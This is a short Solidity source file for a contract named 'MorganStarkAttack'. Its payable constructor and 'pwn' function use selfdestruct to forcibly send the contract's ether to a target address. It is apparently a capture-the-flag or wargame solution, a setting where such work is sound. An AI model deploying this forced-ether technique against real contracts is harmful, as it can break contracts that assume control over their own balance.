pragma solidity ^0.4.24;

contract MorganStarkAttack {
    constructor() public payable{
    }

    function pwn(address _target) public {
        selfdestruct(_target);
    }
}